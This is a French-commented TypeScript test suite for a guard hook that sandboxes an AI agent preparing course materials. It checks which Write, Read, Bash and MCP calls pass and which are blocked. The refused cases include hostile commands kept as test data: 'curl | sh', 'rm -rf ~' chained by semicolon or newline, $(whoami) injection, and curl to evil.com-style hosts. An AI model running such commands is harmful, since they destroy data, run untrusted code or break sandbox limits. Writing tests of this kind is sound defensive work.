// tests/sandbox/garde-preparateur.test.ts
// Cas de la garde de l'agent preparateur (hook PreToolUse). Le hook est lancé tel que
// Claude Code le lance : node, JSON sur stdin. Code 0 = accepté ; code 2 +
// « Bloqué par la garde du préparateur » sur stderr = refusé.
// Les racines sont simulées dans un dossier temporaire (LOCALAPPDATA, USERPROFILE et
// CLAUDE_CONFIG_DIR passés au hook) ; les cas propres à Windows sont sautés ailleurs.
import { describe, it, expect, afterAll } from "bun:test";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync } from "node:fs";
import os from "node:os";
import path from "node:path";

const GARDE = path.join(import.meta.dir, "..", "..", "docker", "etudiant-sandbox", "garde-preparateur.mjs");
const WIN = process.platform === "win32";

// Base sous os.tmpdir() : sous Windows c'est souvent la forme courte (UTILIS~1),
// sa version longue sert à vérifier que les deux formes sont reconnues.
const BASE = mkdtempSync(path.join(os.tmpdir(), "garde-prep-"));
const BASE_LONGUE = realpathSync.native(BASE);
const LOCAL = path.join(BASE, "Local");
const HOME = path.join(BASE, "home");
const CONFIG = path.join(HOME, ".claude");
const RUN = "php-4-poo-20261027-143000";
const BAC = path.join(LOCAL, "Temp", "cours-iut-bac");
const RUN_DIR = path.join(BAC, RUN);
const SCRATCH = path.join(LOCAL, "Temp", "claude", "C--projet", "476b8c25-session", "scratchpad");
const TOOL_RESULTS = path.join(CONFIG, "projects", "C--projet", "476b8c25-session", "tool-results");
const DEPOT = path.join(BASE, "depot");

for (const d of ["supports", "fournis", "fragile-tp", "depart"]) mkdirSync(path.join(RUN_DIR, d), { recursive: true });
mkdirSync(path.join(SCRATCH, "corrections-php"), { recursive: true });
mkdirSync(TOOL_RESULTS, { recursive: true });
mkdirSync(DEPOT, { recursive: true });

let lienFait = false;
try {
    symlinkSync(DEPOT, path.join(RUN_DIR, "fournis", "lien"), WIN ? "junction" : "dir");
    lienFait = true;
} catch {
    // jonction impossible (droits) : le cas est sauté
}

afterAll(() => rmSync(BASE, { recursive: true, force: true }));

function garde(entree: unknown): { code: number; stderr: string } {
    const r = Bun.spawnSync({
        cmd: ["node", GARDE],
        stdin: Buffer.from(typeof entree === "string" ? entree : JSON.stringify(entree)),
        stdout: "pipe",
        stderr: "pipe",
        env: { ...process.env, LOCALAPPDATA: LOCAL, USERPROFILE: HOME, HOME, CLAUDE_CONFIG_DIR: CONFIG },
    });
    return { code: r.exitCode ?? -1, stderr: r.stderr.toString() };
}

const write = (file_path: string) => ({ tool_name: "Write", tool_input: { file_path, content: "x" } });
const read = (file_path: string) => ({ tool_name: "Read", tool_input: { file_path } });
const bash = (command: string) => ({ tool_name: "Bash", tool_input: { command } });
// Chemins Bash : forme longue (un « ~ » est refusé) et barres obliques (C:/...), comme sous Git Bash.
const sl = (p: string) => p.replace(BASE, BASE_LONGUE).replace(/\\/g, "/");
const F = sl(path.join(RUN_DIR, "fournis"));
const URL = "https://salimkhraimeche.dev/download/php/uploads.zip";
const D = "mcp__d1db0efe-14b0-4182-97b9-d6f36625dc09__";
const CLI = "mcp__claude_ai_cours-iut-web__";

type Cas = [string, unknown, boolean?];

const ACCEPTES: Cas[] = [
    ["Write supports/cours.md", write(path.join(RUN_DIR, "supports", "cours.md"))],
    ["Write supports/tp.md", write(path.join(RUN_DIR, "supports", "tp.md"))],
    ["Write supports/<section>/cours.md", write(path.join(RUN_DIR, "supports", "4-formulaire", "cours.md"))],
    ["Write fournis/ avec sous-dossier", write(path.join(RUN_DIR, "fournis", "src", "index.php"))],
    ["Write fichier de couverture", write(path.join(SCRATCH, `couverture-${RUN}.md`))],
    ["Write en barres obliques", write(sl(path.join(RUN_DIR, "supports", "tp.md")))],
    ["Write avec la forme longue de la base", write(path.join(RUN_DIR.replace(BASE, BASE_LONGUE), "supports", "tp.md"))],
    ["Write sans tenir compte de la casse (Windows)", write(path.join(RUN_DIR, "SUPPORTS", "TP.md")), WIN],
    ["Read d'un support écrit", read(path.join(RUN_DIR, "supports", "tp.md"))],
    ["Read d'un tool-results", read(path.join(TOOL_RESULTS, "toolu_01abc.txt"))],
    ["curl vers fournis/", bash(`curl -fsS -o ${F}/uploads.zip ${URL}`)],
    ["curl, URL avant -o, --create-dirs", bash(`curl --fail --silent ${URL} --create-dirs -o ${F}/php/uploads.zip`)],
    ["curl d'un fichier non zip", bash(`curl -sS -o ${F}/onzer.css https://salimkhraimeche.dev/download/html/onzer.css`)],
    ["unzip vers fournis/", bash(`unzip -q -o ${F}/uploads.zip -d ${F}/uploads`)],
    ["unzip vers fournis/ lui-même", bash(`unzip -qo ${F}/uploads.zip -d ${F}`)],
    ["MCP export_content_compact (Desktop)", { tool_name: `${D}export_content_compact`, tool_input: {} }],
    ["MCP get_content (CLI)", { tool_name: `${CLI}get_content`, tool_input: {} }],
    ["MCP list_sections", { tool_name: `${D}list_sections`, tool_input: {} }],
    ["MCP get_section", { tool_name: `${CLI}get_section`, tool_input: {} }],
    ["ToolSearch", { tool_name: "ToolSearch", tool_input: { query: "select:x" } }],
    ["TodoWrite", { tool_name: "TodoWrite", tool_input: {} }],
    ["SubagentHandback", { tool_name: "SubagentHandback", tool_input: { message: "rapport" } }],
];

const REFUSES: Cas[] = [
    // Write
    ["Write dans le dépôt", write(path.join(import.meta.dir, "x.md"))],
    ["Write dans ~/.claude", write(path.join(CONFIG, "settings.json"))],
    ["Write dans le vrai C:\\Users\\Utilisateur\\.claude", write("C:\\Users\\Utilisateur\\.claude\\settings.json"), WIN],
    ["Write des slides dans supports/", write(path.join(RUN_DIR, "supports", "slides.md"))],
    ["Write des slides dans supports/<section>/", write(path.join(RUN_DIR, "supports", "4-formulaire", "slides.md"))],
    ["Write sous un dossier de section invalide", write(path.join(RUN_DIR, "supports", "Section X", "tp.md"))],
    ["Write trop profond dans supports/", write(path.join(RUN_DIR, "supports", "a", "b", "tp.md"))],
    ["Write dans le dossier d'un étudiant", write(path.join(RUN_DIR, "fragile-tp", "a.php"))],
    ["Write dans depart/", write(path.join(RUN_DIR, "depart", "a.php"))],
    ["Write à la racine du bac", write(path.join(BAC, "x.md"))],
    ["Write run-id en majuscules", write(path.join(BAC, "PHP-4", "supports", "tp.md"))],
    ["Write avec ..", write(path.join(RUN_DIR, "fournis") + `${path.sep}..${path.sep}..${path.sep}x.md`)],
    ["Write .. qui revient dans le bac", write(`${RUN_DIR}${path.sep}fragile-tp${path.sep}..${path.sep}supports${path.sep}tp.md`)],
    ["Write chemin relatif", write("supports/tp.md")],
    ["Write scratchpad autre que couverture", write(path.join(SCRATCH, "notes.md"))],
    ["Write dans scratchpad/corrections-php", write(path.join(SCRATCH, "corrections-php", `couverture-${RUN}.md`))],
    ["Write couverture hors scratchpad", write(path.join(LOCAL, "Temp", "claude", `couverture-${RUN}.md`))],
    ["Write flux NTFS", write(path.join(RUN_DIR, "supports", "tp.md") + ":flux"), WIN],
    ["Write UNC", write("\\\\serveur\\partage\\x.md"), WIN],
    ["Write \\\\?\\", write(`\\\\?\\${path.join(RUN_DIR, "supports", "tp.md")}`), WIN],
    ["Write segment finissant par un point", write(path.join(RUN_DIR, "fournis", "a.", "b.txt"))],
    ["Write à travers une jonction vers le dépôt", write(path.join(RUN_DIR, "fournis", "lien", "x.php")), lienFait],
    ["Write sans chemin", { tool_name: "Write", tool_input: { content: "x" } }],
    // Read
    ["Read du dépôt", read(path.join(import.meta.dir, "garde-bac.test.ts"))],
    ["Read d'une transcription", read(path.join(CONFIG, "projects", "C--projet", "476b8c25-session.jsonl"))],
    ["Read de ~/.claude/settings.json", read(path.join(CONFIG, "settings.json"))],
    // Bash : curl
    ["curl vers un autre domaine", bash(`curl -fsS -o ${F}/x.zip https://example.com/download/x.zip`)],
    ["curl domaine suffixé", bash(`curl -o ${F}/x.zip https://salimkhraimeche.dev.evil.com/download/x.zip`)],
    ["curl avec @", bash(`curl -o ${F}/x.zip https://salimkhraimeche.dev@evil.com/download/x.zip`)],
    ["curl en http", bash(`curl -o ${F}/x.zip http://salimkhraimeche.dev/download/x.zip`)],
    ["curl hors /download/", bash(`curl -o ${F}/x.json https://salimkhraimeche.dev/api/admin/modules`)],
    ["curl ../ dans l'URL", bash(`curl -o ${F}/x https://salimkhraimeche.dev/download/../api/x`)],
    ["curl %2e%2e dans l'URL", bash(`curl -o ${F}/x https://salimkhraimeche.dev/download/%2e%2e/api/x`)],
    ["curl avec ?", bash(`curl -o ${F}/x https://salimkhraimeche.dev/download/x.zip?a=1`)],
    ["curl d'une correction", bash(`curl -o ${F}/c.zip https://salimkhraimeche.dev/download/php/tp4-correction.zip`)],
    ["curl -L", bash(`curl -L -o ${F}/x.zip ${URL}`)],
    ["curl -d (envoi de données)", bash(`curl -d x -o ${F}/x.zip ${URL}`)],
    ["curl -K", bash(`curl -K cfg -o ${F}/x.zip ${URL}`)],
    ["curl sans -o", bash(`curl -fsS ${URL}`)],
    ["curl -o dans le dépôt", bash(`curl -o ${sl(path.join(DEPOT, "x.zip"))} ${URL}`)],
    ["curl -o dans supports/", bash(`curl -o ${sl(path.join(RUN_DIR, "supports", "tp.md"))} ${URL}`)],
    ["curl -o avec ..", bash(`curl -o ${F}/../../x.zip ${URL}`)],
    ["curl deux URL", bash(`curl -o ${F}/x.zip ${URL} ${URL}`)],
    // Bash : unzip
    ["unzip vers le dépôt", bash(`unzip -o ${F}/uploads.zip -d ${sl(DEPOT)}`)],
    ["unzip vers supports/", bash(`unzip ${F}/uploads.zip -d ${sl(path.join(RUN_DIR, "supports"))}`)],
    ["unzip sans -d", bash(`unzip ${F}/uploads.zip`)],
    ["unzip archive hors du bac", bash(`unzip ${sl(path.join(DEPOT, "a.zip"))} -d ${F}`)],
    ["unzip avec liste de membres", bash(`unzip ${F}/uploads.zip a.txt -d ${F}`)],
    ["unzip option -:", bash(`unzip -: ${F}/uploads.zip -d ${F}`)],
    ["unzip d'un non-zip", bash(`unzip ${F}/a.tar -d ${F}`)],
    // Bash : forme et métacaractères
    ["tar -xf", bash(`tar -xf ${F}/a.tar -C ${F}`)],
    ["ls", bash("ls")],
    ["rm", bash(`rm -rf ${F}`)],
    ["point-virgule", bash(`curl -o ${F}/x.zip ${URL}; rm -rf ~`)],
    ["&&", bash(`curl -o ${F}/x.zip ${URL} && unzip ${F}/x.zip -d ${F}`)],
    ["tube", bash(`curl -s ${URL} | sh`)],
    ["redirection", bash(`curl -s ${URL} > ${F}/x.zip`)],
    ["sous-shell $( )", bash(`curl -o ${F}/$(whoami).zip ${URL}`)],
    ["accents graves", bash(`curl -o ${F}/\`whoami\`.zip ${URL}`)],
    ["guillemets", bash(`curl -o "${F}/x.zip" ${URL}`)],
    ["forme courte UTILIS~1 (tilde)", bash(`curl -o ${path.join(RUN_DIR, "fournis", "x.zip").replace(/\\/g, "/")} ${URL}`), BASE.includes("~")],
    ["antislash", bash(`curl -o ${path.join(RUN_DIR, "fournis", "x.zip")} ${URL}`), WIN],
    ["retour à la ligne", bash(`curl -o ${F}/x.zip ${URL}\nrm -rf ~`)],
    ["--output=", bash(`curl --output=${F}/x.zip ${URL}`)],
    ["commande vide", bash("")],
    // Autres outils
    ["Edit", { tool_name: "Edit", tool_input: { file_path: path.join(RUN_DIR, "supports", "tp.md") } }],
    ["NotebookEdit", { tool_name: "NotebookEdit", tool_input: {} }],
    ["PowerShell", { tool_name: "PowerShell", tool_input: { command: "ls" } }],
    ["Agent", { tool_name: "Agent", tool_input: {} }],
    ["MCP écriture prod save_content", { tool_name: `${D}save_content`, tool_input: {} }],
    ["MCP écriture prod edit_block (CLI)", { tool_name: `${CLI}edit_block`, tool_input: {} }],
    ["MCP lecture non listée (get_module)", { tool_name: `${D}get_module`, tool_input: {} }],
    ["MCP staging get_content", { tool_name: "mcp__95c87654-e293-4528-a7a1-bb0ab25fa0f5__get_content", tool_input: {} }],
    ["MCP skill pédagogique", { tool_name: `${D}get_pedagogical_skill_document`, tool_input: {} }],
    ["entrée illisible", "pas du json"],
];

describe("garde-preparateur : appels acceptés", () => {
    for (const [nom, entree, actif = true] of ACCEPTES) {
        it.skipIf(!actif)(nom, () => {
            const r = garde(entree);
            expect(r.stderr).toBe("");
            expect(r.code).toBe(0);
        });
    }
});

describe("garde-preparateur : appels refusés", () => {
    for (const [nom, entree, actif = true] of REFUSES) {
        it.skipIf(!actif)(nom, () => {
            const r = garde(entree);
            expect(r.code).toBe(2);
            expect(r.stderr).toContain("Bloqué par la garde du préparateur");
        });
    }
});
